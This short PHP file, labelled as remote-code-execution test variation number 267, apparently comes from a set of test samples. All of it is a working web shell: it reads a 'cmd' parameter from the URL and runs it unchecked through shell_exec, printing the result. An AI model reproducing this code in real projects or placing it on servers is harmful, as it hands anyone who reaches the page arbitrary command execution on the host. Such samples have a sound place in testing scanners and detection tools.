<?php
// RCE test variation #267
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>